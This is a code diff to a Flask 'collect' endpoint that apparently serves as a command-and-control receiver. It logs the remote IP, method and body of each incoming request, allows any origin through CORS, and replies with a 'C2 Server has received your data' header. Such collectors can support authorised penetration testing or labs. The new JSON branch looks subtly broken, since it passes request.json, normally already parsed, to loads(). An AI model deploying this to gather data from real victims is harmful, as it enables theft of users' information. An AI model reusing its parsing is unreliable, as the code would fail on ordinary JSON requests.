@@ -23,7 +23,8 @@ def collect(id):
         owner = cursor.execute(
             """SELECT username FROM users WHERE identifier = ?""", (id,)
         ).fetchall()[0][0]
-    except IndexError:
+    except IndexError as e:
+        print(e)
         owner = "admin"
     if request.method == "GET":
         cursor.execute(
@@ -43,7 +44,14 @@ def collect(id):
         )
 
     elif request.method == "POST":
-        placeholder = request.values | loads(request.json) | request.data
+        
+        match request.headers.get('content-type'): #Add other content-types to this as needed
+            case 'application/json':
+                data = loads(request.json)
+                data = str("".join("%s: %s" % (k, data[k]) for k in data))
+            case _:
+                data = request.data
+            
         cursor.execute(
             """INSERT INTO data (uuid, time_stamp, remote_ip, method, received, owner) VALUES (?, ?, ?, ?, ?, ?);""",
             (
@@ -51,7 +59,7 @@ def collect(id):
                 str(datetime.utcfromtimestamp(time()).strftime("%Y-%m-%d %H:%M:%S")),
                 str(request.remote_addr),
                 "POST",
-                "".join("%s: %s" % (k, placeholder) for k in placeholder),
+                data,
                 owner,
             ),
         )
@@ -60,7 +68,7 @@ def collect(id):
     resp.status = "200"
     connection.commit()
     connection.close()
-    resp.headers["P2-C2"] = "C2 Server has received your data :)"
+    resp.headers["C2"] = "C2 Server has received your data :)"
     resp.headers["Access-Control-Allow-Origin"] = "*"
     return resp
 
